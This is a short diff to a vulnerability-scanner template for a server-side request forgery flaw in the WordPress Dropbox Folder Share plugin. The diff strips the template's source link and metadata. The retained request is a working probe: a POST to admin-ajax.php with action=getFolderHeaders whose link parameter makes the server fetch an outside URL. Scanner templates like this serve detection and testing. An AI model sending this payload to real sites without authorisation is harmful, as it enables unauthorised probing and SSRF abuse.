@@ -3,12 +3,8 @@ info:
   name: WordPress Dropbox Folder Share 服务器端请求伪造漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ycf4gg6yli2atskt'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ycf4gg6yli2atskt
-    fofa: 暂无
 http:
 - raw:
   - 'POST /wp-admin/admin-ajax.php HTTP/1.1
@@ -24,8 +20,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     action=getFolderHeaders&link=http://www.baidu.com
